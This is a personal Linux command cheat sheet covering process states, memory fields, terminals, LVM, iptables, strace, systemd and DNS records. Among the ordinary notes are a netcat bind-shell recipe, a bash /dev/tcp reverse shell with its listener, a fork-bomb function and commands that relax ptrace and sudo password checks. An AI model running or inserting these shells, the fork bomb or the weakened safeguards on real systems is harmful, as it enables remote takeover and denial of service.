in kilobytes. default is 32k. (http://www.kernel.org/doc/Documentation/fb/fbcon.txt)

search with locate:
1. locate --basename '\pkg'
output: /usr/src/linux-headers-4.8.0-26-generic/include/config/x86/pkg
2. locate --basename 'pkg'
output: a lot, such as /var/log/dpkg.log
conclusion: 'pkg' means '*pkg*'
upshot: Where \ is a globbing character, it disables the implicit replacement of pkg by *pkg*.

import : saves any visible window on an X server and outputs it as an image file. You can capture a
       single window, the entire screen, or any rectangular portion of the screen.
example: import -window emacs5 test.jpg

restart frozen system (not tested):
Press ALT + PrntScrn and then, while holding those, type the following letters in order: REISUB.

/etc/rc.local : executed on reboot

top/htop process states:
R    running or runnable (on run queue)
S    interruptible sleep (waiting for an event to complete)
D    uninterruptible sleep (usually IO)
Z    defunct ("zombie") process, terminated but not reaped by its parent
T    stopped by job control signal
t    stopped by debugger during the tracing
X    dead (should never be seen)
===
memory usage:
VIRT/VSZ :
The total amount of virtual memory used by the task. It includes all code, data and shared libraries
plus pages that have been swapped out and pages that have been mapped but not used.
If an application requests 1 GB of memory but uses only 1 MB, then VIRT will report 1 GB. not very useful.
---
RES/RSS: is the portion of memory occupied by a process that is held in main memory (RAM).
non-swapped physical memory used by a process. does not include the swapped out memory.
some of the memory may be shared with other processes.
If a process uses 1 GB of memory and it calls fork(), the result of forking will be two processes
whose RES is both 1 GB but only 1 GB will actually be used since Linux uses copy-on-write.
---
SHR: The amount of shared memory used by a task.
---
MEM% : A task's currently used share of available physical memory.

line discipline: cat /proc/tty/ldiscs
cat /proc/tty/drivers

ldattach: attach a line discipline to a serial line

A line discipline (LDISC) is a layer in the terminal subsystem in some Unix-like systems. The
terminal subsystem consists of three layers: the upper layer to provide the character device
interface, the lower hardware driver to communicate with the hardware or pseudo terminal, and the
middle line discipline to specify a policy for the driver.
---
line discipline does input processing in the kernel (provide line editing)

tty: (stty -a)
canonical mode: icanon (input characters are assembled into lines)
icrnl (translate CR to newline)
-igncr : don't ignore CR
====
serial port terminal: /dev/ttySn
pseudo terminal: /dev/pty
controlling terminal: /dev/tty
console: /dev/ttyn, /dev/console

EDID: /sys/class/drm/*/edid
EDID program: sudo get-edid | parse-edid
sample output:
Section "Monitor"
        Identifier "DELL P2411H"
        ModelName "DELL P2411H"
        VendorName "DEL"
        # Monitor Manufactured week 22 of 2011
        # EDID version 1.3
        # Analog Display
        Option "SyncOnGreen" "true"
        DisplaySize 530 300
        Gamma 2.20
        Option "DPMS" "true"
        Horizsync 30-83
        VertRefresh 56-76
        # Maximum pixel clock is 170MHz
        #Not giving standard mode: 1152x864, 75Hz
        #Not giving standard mode: 1280x1024, 60Hz
        #Not giving standard mode: 1920x1080, 60Hz
        Modeline        "Mode 0" 148.50 1920 2008 2052 2200 1080 1084 1089 1125 +hsync +vsync
EndSection

sudo hwinfo --monitor will list the graphics modes supported by the monitor. also detailed info about monitor
sudo hwinfo --framebuffer will list the graphics modes supported by the computer.

a Snap app is self-contained package that includes all of the dependencies and libraries that an
application needs to run. These apps are sandboxed, install to their own directory, and can’t touch,
see or otherwise 'interface' with the rest of your system without your permission.

find broken symbolic links:
find . -type l -! -exec test -e {} \; -print

dump man pages:
man man | col -b  > file.txt # col -b: remove backspaces

blacklisting on kernel command line: modprobe.blacklist=modulename

change sudo timeout session:
#1. edit file: sudo visudo
#2. add this line:
Defaults        env_reset,timestamp_timeout=20 #20 minutes
#if 0, timeout right away, if -1, disable password prompt

kill: If sig is 0, then no signal is sent, but error checking is still performed.

#system info tool
inxi --recommends #check system
inxi #without argument
inxi -S #system
inxi -M #machine
inxi -C #cpu
inxi -G #graphics
inxi -A #audio
inxi -N #network
inxi -D #hard disk
inxi -b #summary
inxi -p #partition
inxi -F #full info

bash -n #check syntax without running

laptop battery checking: acpi

curl ifconfig.me #get your IP address from the viewpoint of others on the internet

getopts
example: ${OPTIND} is equal to 1 , ${!OPTIND} is equal to the value of the first argument

sysctl -w net.core.netdev_max_backlog=16384
sysctl -w net.ipv4.tcp_max_syn_backlog=8192
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.core.rmem_max=16777216
sysctl -w net.core.wmem_max=16777216
sysctl -w net.ipv4.tcp_rmem="4096 87380 16777216"
sysctl -w net.ipv4.tcp_wmem="4096 16384 16777216"
sysctl -w net.ipv4.ip_local_port_range="1024 65535"
sysctl -w net.ipv4.tcp_tw_recycle=1
sysctl net.ipv4.tcp_available_congestion_control

/etc/security/limits.conf:
theusername		hard nofile	40000
theusername		soft nofile	40000

/etc/securetty : specify where root user can log on
chage: change password expiry info (password aging)

Tripwire: Intrusion Detection

httpie example:
#1. send json data
http POST URL name=blah
#2. see the request being sent: -v
http -v POST URL name=blah
#3. send header
http -v POST URL name=blah appcontext:cheok
#
http POST :2525 #assume localhost
#4. post from file
http POST url < file.json
http POST url <<< '{"name" : 9310238}'
#5. http -h #print only response header
#6. http -b #print only response body
-- curl equivalent:
curl -s -X POST --data '@/path/to/filename.json' URL
curl -s -X POST --data-binary '@/path/to/filename.json' URL
===
--timeout SECONDS, default is 30 sec

sed : extended regexp
--
The only difference between basic and extended regular expressions is in the behavior of a few
characters: ?, +, parentheses, and braces ({}). While basic regular expressions require these to be
escaped if you want them to behave as special characters, when using extended regular expressions
you must escape them if you want them to match a literal character.

#search only file that match a pattern
grep -r --include "*.py" <pattern>

wrk: a HTTP benchmarking tool
wrk -t3 -c1000 -d10s http://127.0.0.1:8080
#  3 threads and 1000 connections

/proc/modules                 displays a list of kernel loaded modules.
/proc/cmdline                   displays the parameters passed to the kernel when the system started.

/proc/sys/fs/file-max this entry specifies the maximum number of open files that Linux can support at any one time.

nproc #show number of processors
other commands: cpuid, hwinfo

samba: implements SMB/CIFS protocol and allows non-Windows machines to network with Windows machines.
SMB: a network file sharing protocol.

show routes:
ip r
route -n
routel
route -nee

monitoring tool: glances

tar cfv dv.tar.gz --exclude="*pycache*" dataVerification/

find out x org version:
xdpyinfo | grep "X.Org version"
OR
X -version

=== use telnet to connect to web server
$ telnet www.google.com 80
Trying 216.58.221.100...
Connected to www.google.com.
Escape character is '^]'.

GET / HTTP/1.1 #press return twice
===

bash: define function syntax: last thing in function definition must be ; or &
* must have a space between { and command
wow(){ wow|wow & }
ano(){ echo hi; }

On Unix and Unix-like computer operating systems, a zombie process or defunct process is a process
that has completed execution (via the exit system call) but still has an entry in the process table:
it is a process in the "Terminated state". This occurs for child processes, where the entry is still
needed to allow the parent process to read its child's exit status: once the exit status is read via
the wait system call, the zombie's entry is removed from the process table and it is said to be
"reaped".

A semaphore is an integer whose value is never allowed to fall below zero. Two operations
can be performed on semaphores: increment the semaphore value by one (sem_post()); and decrement
the semaphore value by one (sem_wait()). If the value of a semaphore is currently zero, then a
sem_wait() operation will block until the value becomes greater than zero.
POSIX semaphores come in two forms: named semaphores and unnamed semaphores.

from: include/linux/semaphore.h:
===
struct semaphore {
        raw_spinlock_t          lock;
        unsigned int            count;
        struct list_head        wait_list;
};

from: include/linux/mutex.h:
struct mutex {
        /* 1: unlocked, 0: locked, negative: locked, possible waiters */
        atomic_t                count;
        spinlock_t              wait_lock;
        struct list_head        wait_list;
        struct task_struct      *owner;
        struct optimistic_spin_queue osq; /* Spinner MCS lock */
        void                    *magic;
        struct lockdep_map      dep_map;
};

from: include/linux/spinlock_types.h:
typedef struct raw_spinlock {
	arch_spinlock_t raw_lock;
	unsigned int break_lock;
	unsigned int magic, owner_cpu;
	void *owner;
	struct lockdep_map dep_map;
} raw_spinlock_t

ptrace: process trace
The ptrace() system call provides a means by which one process (the "tracer") may observe and
control the execution of another process (the "tracee"), and examine and change the tracee's memory
and registers.  It is primarily used to implement breakpoint debugging and system call tracing.
--
error: Can't attach to the process: ptrace(PTRACE_ATTACH, ..)
solution: echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
default value of /proc/sys/kernel/yama/ptrace_scope is 1
put a value of zero in /proc/sys/kernel/yama/ptrace_scope

#list files opened by a process
#1. ls /proc/<pid>/fd
#2. lsof -a -p <pid>
#3. lsof -a -p <pid> / #list files that begin with / (actual files):
#4. lsof -r1 -a -p <pid> / #-r1: repeat every 1 second

Aliases are not expanded when the shell is not interactive, unless the expand_aliases shell option
is set using shopt: shopt -s expand_aliases

Aliases are deprecated in favor of shell functions.
function xoo(){ xdg-open; }
export -f xoo #make function visible to script

cannot use external aliases in bash shell script, use functions instead
=== script ==
#!/bin/bash
ls
====
then do:
function ls(){ echo "hi cheok"; }
export -f ls
===
the script will execute the ls function
lesson: script will execute function first. attackers can make scripts do something else.
script should use absolute path to commands.

== class test command ==
-a <FILE>	True if <FILE> exists. (not recommended, may collide with -a for AND, see below)
-e <FILE>	True if <FILE> exists.
-f <FILE>	True, if <FILE> exists and is a regular file.
-d <FILE>	True, if <FILE> exists and is a directory.
-c <FILE>	True, if <FILE> exists and is a character special file.
-b <FILE>	True, if <FILE> exists and is a block special file.
-p <FILE>	True, if <FILE> exists and is a named pipe (FIFO).
-S <FILE>	True, if <FILE> exists and is a socket file.
-L <FILE>	True, if <FILE> exists and is a symbolic link.
-h <FILE>	True, if <FILE> exists and is a symbolic link.
-g <FILE>	True, if <FILE> exists and has sgid bit set.
-u <FILE>	True, if <FILE> exists and has suid bit set.
-r <FILE>	True, if <FILE> exists and is readable.
-w <FILE>	True, if <FILE> exists and is writable.
-x <FILE>	True, if <FILE> exists and is executable.
-s <FILE>	True, if <FILE> exists and has size bigger than 0 (not empty).
-t <fd>	True, if file descriptor <fd> is open and refers to a terminal.
<FILE1> -nt <FILE2>	True, if <FILE1> is newer than <FILE2> (mtime).
<FILE1> -ot <FILE2>	True, if <FILE1> is older than <FILE2> (mtime).
<FILE1> -ef <FILE2>	True, if <FILE1> and <FILE2> refer to the same device and inode numbers.
===
-z <STRING>	True, if <STRING> is empty.
-n <STRING>	True, if <STRING> is not empty (this is the default operation).
<STRING1> = <STRING2>	True, if the strings are equal.
<STRING1> != <STRING2>	True, if the strings are not equal.
<STRING1> < <STRING2>	True if <STRING1> sorts before <STRING2> lexicographically (pure ASCII, not current locale!).
                        Remember to escape! Use \<
<STRING1> > <STRING2>	True if <STRING1> sorts after <STRING2> lexicographically (pure ASCII, not current locale!).
                        Remember to escape! Use \>
==
<INTEGER1> -eq <INTEGER2>	True, if the integers are equal.
<INTEGER1> -ne <INTEGER2>	True, if the integers are NOT equal.
<INTEGER1> -le <INTEGER2>	True, if the first integer is less than or equal second one.
<INTEGER1> -ge <INTEGER2>	True, if the first integer is greater than or equal second one.
<INTEGER1> -lt <INTEGER2>	True, if the first integer is less than second one.
<INTEGER1> -gt <INTEGER2>	True, if the first integer is greater than second one.

sysdig: monitor user activity in real-time

copy with relative path
after operation, we have ~/wow/org/apache/maven/plugins/maven-install-plugin/2.4
#1. rsync -R
rsync -avR org/apache/maven/plugins/maven-install-plugin/2.4/* ~/wow
#2. cp --parents
cp --parents org/apache/maven/plugins/maven-install-plugin/2.4/* ~/wow
#3. tar
tar cf - org/apache/maven/plugins/maven-install-plugin/2.4 | tar xf - -C ~/wow

expr command:
expr length "cheok" #length of string
expr 6 / 4 #quotient
expr 6 % 4 #remainder
===
expr string : regexp
regexp has to match entire string
example:
#1. expr linux : lin    #return # of chars matched
return 3, exit status: 0
#2. expr linux : '\(lin\)' #print matched chars
return lin

#implement dirname as a function
function dirname(){ echo $1 | sed 's:\(.*\)/.*:\1:'; }

#current directory only
find . -maxdepth 1
find . -mindepth 1 #don't show current directory (.)
-mindepth 1 means process all files except the starting-points.

lslogins - display information about known users in the system
lastlog

LVM (logical volume manager) is a method of allocating hard drive space into logical volumes that
can be easily resized instead of partitions

# number the columns
head -1 ??.csv | tr "," "\n" | nl

#make column lists , or make a table
(printf "PERM LINKS OWNER GROUP SIZE MONTH DAY HH:MM/YEAR NAME\n" ; ls -l | sed 1d) | column -t

#replace the 2nd occurrence of a pattern
echo "this,is,just,a,test" | sed 's/,/ /2'


#this does not work, syntax error
while ...; do command &; done
#this works
while ...; do command & done
#another solution
while ...; do coproc command ; done

coproc: a shell built-in
Create a coprocess, Execute COMMAND asynchronously

#delete last character from each line
cat file | rev | colrm 1 1 | rev

PPID shell variable

echo $0 # from cmdline
output: bash

sudo -E #preserve environment variables
sudo -E does not work if /etc/sudoers has secure_path set
workaround: sudo env "PATH=$PATH" <command...>

lspci | egrep -i 'wifi|wlan|wireless'
lspci -s [[[[<domain>]:]<bus>]:][<slot>][.[<func>]]
lspci -vv -s 00:19.0

#match any of multiple patterns:
$ grep "PATTERN1\|PATTERN2" FILE
$ grep -E "PATTERN1|PATTERN2" FILE
$ grep -e PATTERN1 -e PATTERN2 FILE
$ egrep "PATTERN1|PATTERN2" FILE
$ awk '/PATTERN1|PATTERN2/' FILE
$ sed -n -e '/PATTERN1/p' -e '/PATTERN2/p' FILE

log rotation:
#1. logrotate (use copytruncate option with stdout), need a cron job
    there is a window for data loss
#2. ./start.sh | rotatelogs -n 3 log/mylog.log 1M (from apache2-utils package)
   shortcoming: the current log is then mylog.log.1, not mylog.log
   also: ./start.sh | /home/myprog/myproglog.%Y-%m-%d-%H_%M_%S 2M
#3. https://superuser.com/questions/291368/log-rotation-of-stdout/291397
    https://askubuntu.com/questions/623038/rotate-nohup-output
#4. multilog : ./start.sh | multilog s1048576 n2 ./log
    s1048576: rotate the log file when it grows to 1MiB
    n2 : 2 rotated files
    shortcoming: the current file is called current (cannot change)
    rotated file is called @<tai64n timestamp>.s
    old log file is automatically removed at restart
    not a good choise
#5. tinylog:
    ./start.sh | ~/workspace/perp-2.07/perp/tinylog -k 5 -s 100000 log &>/dev/null
    current file is called current
    old logs: _20171215T235831.267856.s, _20171215T235836.718277.s, etc
    s suffix: safely written to disk
    _20171216T000053.423569.u : u means not safely written, this happens
    when we kill the process that pipes to tinylog. Upon restart, tinylog
    immediately rotate current and use the u suffix
    verdict: seems like a good choice

<program> 1</dev/null # runs program with a read-only stdout

mDNS: multicast DNS with service discovery, zeroconf
avahi:open-source implementation of zeroconf
avahi-browse -av
avahi-browse -atr
avahi-resolve -4 -n name.local

# test to see if any data on stdin
read -t 0
if [ $? -ne 0 ]; then
    # no data on stdin
    echo "Usage: $0 < filename"
else
    echo "Got data"
fi

VGA: 640x480
SVGA: 800x600
XGA: 1024x768

fbset: show/modify frame buffer device settings.

env -i: run program in an empty environment

Udev is the device manager that creates/removes device nodes in the /dev directory dynamically. It
is the successor of devfs and hotplug.
udev replaces the functionality of both hotplug and hwdetect.

#apply ed script: use diff -e old new
(cat diff.txt && echo w) | ed - <oldfile>

/etc/networks: link-local stuff

less: while paging, -i triggers smart-casing
smart-casing: ignore case when the pattern does not contain uppercase
===
less +F blah : follow, like tail -f, C-c to leave follow mode
less: while paging: F triggers follow mode, C-c to leave follow mode

column -t: create a table

web shell:
# on server side:
$ mkfifo /tmp/f
$ cat /tmp/f | /bin/sh -i 2>&1 | nc -nvv -l 1234 > /tmp/f
explanation:
when netcat receives input from the client connection, it will redirect it to FIFO.
example: client connection sends "ls", "ls" will be redirected to FIFO.
"ls" will come out the other end and be piped to /bin/sh. /bin/sh will execute
"ls and the output of "ls" will be piped to the same netcat process.
Any input to the server netcat process will be sent to the client connection.

mtr: my traceroute

sensible-editor, sensible-pager, sensible-browser
select-editor -> ~/.selected_editor
choices:
  1. /bin/ed
  2. /bin/nano        <---- easiest
  3. /usr/bin/emacs24
  4. /usr/bin/vim.basic
  5. /usr/bin/vim.tiny

reverse shell:
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
===
reverse shell:
on target: bash -i >& /dev/tcp/localhost/8080 0>&1
on attacker:  nc -v -C -l localhost 8080
now the attacker has a connection to the target

The command bash -i >& invokes bash with an “interactive” option. Then /dev/tcp/10.0.0.1/8080
redirects that session to a tcp socket via device file.  Finally 0>&1 Takes standard output, and
connects it to standard input.

bash's built-in /dev/tcp device file

get time:
$ cat </dev/tcp/time.nist.gov/13
58341 18-08-11 17:55:07 50 0 0   0.0 UTC(NIST) *
$ curl time.nist.gov:13
58341 18-08-11 17:55:20 50 0 0 385.1 UTC(NIST) *

# causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket.
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3

xargs example
find Pictures/tecmint/ -name *.png -type f -print0 | xargs -0 tar -cvzf images.tar.gz
# convert multi-line output into single line
ls -1 | xargs
# "{}" does not seem necessary
find Downloads -name "DomTerm" -type d -print0 | xargs -0 /bin/rm -v -rf "{}"
find . -name "net_stats" -type f -print0 | xargs -0 /bin/rm -v -rf "{}"
---
$ echo cheok hee | xargs -n 1 -t ls
$ echo "cheok hee" | xargs -n 1 -t ls
ls cheok
ls hee
===
$ echo cheok hee | xargs -I{} -n 1 -t ls {}
ls cheok hee
$ echo cheok hee | xargs -I{} -t ls {}
ls cheok hee

--> don't mix -n and -I
===================================

dconf write /org/gnome/desktop/interface/cursor-size 48
gsettings set com.ubuntu.user-interface.desktop cursor-size 48

ufw: uncomplicated firewall

#trace a specific system call
strace -e open ls
#trace multiple system calls
strace -e trace=open,read ls /home
#generate statistical report
strace -c ls /home
#write to file
strace -o dconf-trace.txt -e open dconf-editor
strace options:
strace -tt: include microsecond
strace -T: show total time
strace -ff: follow child process and output separately
strace -e trace=network

gsettings set org.gnome.settings-daemon.peripherals.mouse locate-pointer true

gsettings get org.gnome.settings-daemon.plugins.media-keys custom-keybindings

xargs: -p, --interactive #implies -t, print command and prompt
xargs: -t, --verbose #print command

udevadm info --query=all --name=/dev/sda
-> P is the sysfs device path, N is the device node, S : symbolic link, E: additional info
P: /devices/pci0000:00/0000:00:1f.2/ata1/host0/target0:0:0/0:0:0:0/block/sda
S: disk/by-id/wwn-0x50014ee20471a970
S: disk/by-path/pci-0000:00:1f.2-ata-1
S: disk/by-id/ata-WDC_WD3200BEKT-60V5T1_WD-WX51A4085890
E: ID_TYPE=disk
E: ID_BUS=ata
E: ID_MODEL=WDC_WD3200BEKT-60V5T1
--
udevadm info -a -n /dev/sda
udevadm monitor --property

SATA disk appear as SCSI device by means of a translation layer in libata

bash special variable: TMOUT, SECONDS, LINENO, REPLY, RANDOM
REPLY: use read without specifying a variable

LVM:
vgdisplay
lvdisplay
vgchange
vgscan
lvscan
lvs
vgs

1. create a physical volume for each hard disk or hard disk partition
2. create volume group from one or more physical volume
3. create one or more logical volume from a volume group
4. create filesystem on logical volume

sudo pvs
  PV             VG        Fmt  Attr PSize   PFree
  /dev/sda1      vg01      lvm2 a--    1.82t     0

sudo pvdisplay
  --- Physical volume ---
  PV Name               /dev/sda1
  VG Name               vg01
  PV Size               1.82 TiB / not usable 4.00 MiB
  Allocatable           yes (but full)
  PE Size               4.00 MiB
  Total PE              476931
  Free PE               0
  Allocated PE          476931
  PV UUID               5r25ZB-qEzP-IoBc-Lts3-VhoN-tGWo-RYQsEP

sudo vgs
  VG        #PV #LV #SN Attr   VSize   VFree
  vg01        1   1   0 wz--n-   1.82t     0

sudo vgdisplay
  --- Volume group ---
  VG Name               vg01
  System ID
  Format                lvm2
  Metadata Areas        1
  Metadata Sequence No  4
  VG Access             read/write
  VG Status             resizable
  MAX LV                256
  Cur LV                1
  Open LV               1
  Max PV                256
  Cur PV                1
  Act PV                1
  VG Size               1.82 TiB
  PE Size               4.00 MiB
  Total PE              476931
  Alloc PE / Size       476931 / 1.82 TiB
  Free  PE / Size       0 / 0
  VG UUID               cWCVMr-4pUQ-vWHV-y5ho-Imid-Md4N-00hirS

sudo lvs
  LV     VG        Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  space  vg01      -wi-ao----   1.82t

$ sudo lvdisplay
  --- Logical volume ---
  LV Path                /dev/vg01/space
  LV Name                space
  VG Name                vg01
  LV UUID                MLryys-VnKI-xRzG-2yGc-05qs-kFw1-Qjrlg1
  LV Write Access        read/write
  LV Creation host, time memphis, 2017-12-13 19:19:05 -0800
  LV Status              available
  # open                 1
  LV Size                1.82 TiB
  Current LE             476931
  Segments               1
  Allocation             inherit
  Read ahead sectors     auto
  - currently set to     256
  Block device           253:1

====================
find my DNS server: nmcli dev show | grep DNS
--> use dnsmasq
others: /etc/resolv.conf, nslookup/dig commands show 127.0.1.1

special bash variables:
LINENO
PROMPT_COMMAND
HISTTIMEFORMAT
SHLVL
REPLY (used with read)
TMOUT

/etc/systemd/logind.conf :
NAutoVTs #number of virtual console

/etc/default/console-setup :
ACTIVE_CONSOLES="/dev/tty[1-6]"

setupcon : sets up the font and the keyboard on the console

Physical console: - A physical terminal device connected with Linux system on serial port via serial cable physically.

Virtual console: - An application that simulates a physical terminal device in software and connects
it with Linux system on serial port through software configuration virtually.

Physical terminal device: - A physical device that consisted of nothing more than a monitor and
keyboard attached to it. It uses all resources such as CPU, RAM and Hard disk from server system.

Virtual terminal application: - An application that provides a text based environment to access the
shell. Since physical terminals are no longer used, it became common practice to use the word
terminal to refer the virtual terminal application.

The word virtual console refers to an application that simulates a physical terminal while the word
terminal refers to an application that allows us to access and use the shell.

virtual console: from Gui: Ctrl-Alt-F1, from virtual console: Alt-(left/right arrow), Alt-F2

chvt: change virtual console

dm-tool : interact with lightdm

https://askubuntu.com/questions/910108/why-is-my-gdm-at-a-different-tty-than-my-desktop-environment

dpkg-reconfigure : reconfigure an already installed package
debconf-show : show existing configuration of an installed package

snap find teams-for-linux
snap install teams-for-linux
snap list
snap changes
snap refresh <package>
snap refresh --list
snap remove <package>

sudo update-alternatives --config editor
/etc/alternatives/ : contain symbolic links to default commands
e.g. /etc/alternatives/editor
#change default browser
sudo update-alternatives --config x-www-browser
update-alternatives --list editor
update-alternatives --get-selections

namespace is an abstraction over resources in the OS.
there are 7 namespaces: Cgroup, IPC, network, Mount, PID, User, UTS
show namespaces of a process: /proc/<pid>/ns
lsns
unshare: run programs with new namespaces (creates new namespaces and then execute the program)
nsenter - run program with namespaces of other processes (executes program in the specified namespace)
---
Namespaces are a feature of the Linux kernel that partitions kernel resources such that one set of
processes sees one set of resources while another set of processes sees a different set of
resources. The feature works by having the same namespace for a set of resources and processes, but
those namespaces refer to distinct resources. Resources may exist in multiple spaces. Examples of
such resources are process IDs, hostnames, user IDs, file names, and some names associated with
network access, and interprocess communication.

A Unix domain socket or IPC socket (inter-process communication socket) is a data communications
endpoint for exchanging data between processes executing on the same host operating system.

socat -v UNIX-LISTEN:/tmp/dockerapi.sock UNIX-CONNECT:/var/run/docker.sock

"nc www.google.com 80" same as "socat - TCP:www.google.com:80"

XDG base directory specification: specify where files should be looked for.
==
data files:
XDG_DATA_HOME : default:$HOME/.local/share , more important than XDG_DATA_DIRS
XDG_DATA_DIRS : example: /usr/local/share:/usr/share
==
config files:
XDG_CONFIG_HOME : default:$HOME/.config
XDG_CONFIG_DIRS : example: /etc/xdg/xdg-Lubuntu:/etc/xdg:/etc:/usr/share
==
XDG_CACHE_HOME : default:$HOME/.cache
===
where runtime files should be stored:
XDG_RUNTIME_DIR=/run/user/1000
---
XDG_SESSION_TYPE: wayland or x11

Cgroups provide a way to limit the amount of resources like CPU and memory that each container can
use.
---
cgroups (control groups) is a Linux kernel feature that limits, accounts for, and isolates the
resource usage (CPU, memory, disk I/O, network, etc.) of a collection of processes.

reptyr - Reparent a running program to a new terminal. take an existing running program and
attaching it to a new terminal.

disown -a && exit

$OSTYPE : "linux-gnu"

/sys/firmware/efi

whereis <command_name>

capabilities:
capsh --print
getpcaps <pid> #show process capabilities
getcap <filename>
sudo setcap cap_net_raw,cap_net_admin+ep "$HOME/.cargo/bin/bandwhich"
----
the “+ep” means you’re adding the capability (“-” would remove it) as Effective and Permitted.
e: Effective
This means the capability is “activated”.
p: Permitted
This means the capability can be used/is allowed.
i: Inherited
The capability is kept by child/subprocesses upon execve() for example.
--
capabilities: a feature that divides the privileges traditionally associated with superuser into
distinct units, known as capabilities, which can be independently enabled and disabled.
Capabilities are a per-thread attribute.

test microphone:
1. arecord -d 5 test-mic.wav #record something
2. aplay test-mic.wav #play

date -d today
-> Fri 13 Mar 2020 02:46:51 PM PDT
date -d "today + 10 days"
-> Mon 23 Mar 2020 02:47:04 PM PDT
date -d "today - 10 days"
-> Tue 03 Mar 2020 01:47:15 PM PST

--conntrack and iptables
1. sudo conntrack -L #no output initially
2. add iptable rule:
sudo iptables -A INPUT -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT
--
$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4. sudo conntrack -L #show:
tcp      6 431983 ESTABLISHED src=192.168.1.71 dst=172.217.12.46 sport=60774 dport=80 src=172.217.12.46 dst=192.168.1.71 sport=80 dport=60774 [ASSURED] mark=0 use=1
5. delete iptable rule:
sudo iptables -D INPUT -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT
===
iptables matching rule: order is important. iptables will run a request past each of its rules, it
will stop when it gets a match
--
#allow outgoing TCP traffic to bigmart.com
iptables -A OUTPUT -p tcp -d bigmart.com -j ACCEPT
#drop outgoing tcp traffic to destination port 80
iptables -A OUTPUT -p tcp --dport 80 -j DROP
#allow incoming tcp traffic to port 22 (ssh) from host 10.0.3.1
iptables -A INPUT -p tcp -s 10.0.3.1 --dport 22 -j ACCEPT
#disallow incoming tcp traffic to port 22 (ssh) from host any other host
iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 22 -j DROP
---
firewall rules are stored in a series known as a chain. list of chains make up a table
3 chains: INPUT, OUTPUT, FORWARD (for routed packets).
---
iptables -A INPUT/OUTPUT/FORWARD
iptables -D INPUT 3 # 3 refers to the third rule in the output
--
iptables tables: filter, nat, mangle

systemd-analyze blame
systemd-analyze time
systemd-analyze plot #generate svg file
systemd-analyze critical-chain
systemd-analyze dump

/etc/systemd/timesyncd.conf

Plymouth is responsible for the boot-up splash screen

/var/log/boot.log

swapon

dtrace: dynamic tracing
http://www.brendangregg.com/dtrace.html

#list contents of initramfs image
lsinitramfs -l /boot/initrd.img
#update initramfs image
sudo update-initramfs -u

"kworker" is a placeholder process for kernel worker threads, which perform most of the actual
processing for the kernel, especially in cases where there are interrupts, timers, I/O, etc. These
typically correspond to the vast majority of any allocated "system" time to running processes.
--
kworker means a Linux kernel process doing "work" (processing system calls). You can have several of
them in your process list: kworker/0:1 is the one on your first CPU core, kworker/1:1 the one on
your second etc..

CPU backtrace:
execute "echo l > /proc/sysrq-trigger" to create a backtrace.
then watch the backtraces at the end of dmesg
--
sysrq need to be enabled with sysctl -w kernel.sysrq=1

top:
P : sort by CPU
M : sort by MEM
T : sort by time
o : activate filter. example: COMMAND=chrome, COMMAND=kworker
ctrl-o : show current filter
= : clear filter
c : show full command
u : show processes of a user
i : toggle display of idle processes
V : forest mode
A : show in different panel, a to move through panel
E to cycle through memory unit
t to cycle cpu display
m to cycle memory display
H : show/hide thread
k : kill a process
top -d 5 -b : batch mode and 5 sec delay
https://www.binarytides.com/linux-top-command/
---
https://www.howtogeek.com/668986/how-to-use-the-linux-top-command-and-understand-its-output/
top command dashboard:
The third line displays the following central processing unit (CPU) values:
us: Amount of time the CPU spends executing processes for people in “user space.”
sy: Amount of time spent running system “kernel space” processes.
ni: Amount of time spent executing processes with a manually set nice value.
id: Amount of CPU idle time.
wa: Amount of time the CPU spends waiting for I/O to complete.
hi: Amount of time spent servicing hardware interrupts.
si: Amount of time spent servicing software interrupts.
st: Amount of time lost due to running virtual machines (“steal time”).
==
The status of the process can be one of the following:
D: Uninterruptible sleep
R: Running
S: Sleeping
T: Traced (stopped)
Z: Zombie
--
==
PID: Process ID.
USER: The owner of the process.
PR: Process priority.
NI: The nice value of the process.
VIRT: Amount of virtual memory used by the process.
RES: Amount of resident memory used by the process.
SHR: Amount of shared memory used by the process.
S: Status of the process. (See the list below for the values this field can take).
%CPU: The share of CPU time used by the process since the last update.
%MEM: The share of physical memory used.
TIME+: Total CPU time used by the task in hundredths of a second.
COMMAND: The command name or command line (name + options).

#tracing in script
set -x # enable tracing
set +x # disable tracing
bash -x <script>
https://advancedweb.hu/debugging-bash-scripts/

df -t squashfs #show /dev/loop

#curl with urlencoded form data
curl -d "param1=value1&param2=value2" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://localhost:3000/blahblah

sudo systemd-run env
sudo systemd-run -t env #connect stdin,stdout,stderr to the invoking terminal
---
https://www.redhat.com/sysadmin/systemd-secure-services

/etc/xdg/autostart
~/.config/autostart
To disable a system-wide entry, add to file: "Hidden=true"

DNS record types:
A: 	IPv4 IP address	192.168.1.5 or 75.126.153.206
AAAA:	IPv6 IP address	2607:f0d0:1002:51::4
CNAME:	Canonical name record (Alias)	s0.cyberciti.org is an alias for d2m4hyssawyie7.cloudfront.net
 example:
  alias.foo.example 10 IN CNAME canonicalname.foo.example.
MX:	Email server host names	smtp.cyberciti.biz or mx1.nixcraft.com (mail exchanger)
 example:
  foo.example. 1d IN MX 10 mail.isp.net.
  10 is the preference value. if there are multiple MX records, the mail transfer agent uses the one
  with the lowest preference value.
  basically, if you have an email addressed to user@foo.example, send it to mail.isp.net
NS:	Name (DNS) server names	ns1.cyberciti.biz or ns-243.awsdns-30.com
    designate the domain name of the authoritative DNS server for the zone.
PTR:	Pointer to a canonical name. Mostly used for implementing reverse DNS lookups	82.236.125.74.in-addr.arpa
        maps an IP address back to a domain name
    example:
      1.0.0.10.in-addr.arpa 1d IN PTR host.foo.example.
      this record reverse-map the IP address 10.0.0.1
SOA:	Authoritative information about a DNS zone (Start of authority)
        MNAME RNAME serial# refresh-interval retry-interval expiration-interval negative-caching-TTL
        MNAME: domain name of the primary DNS server
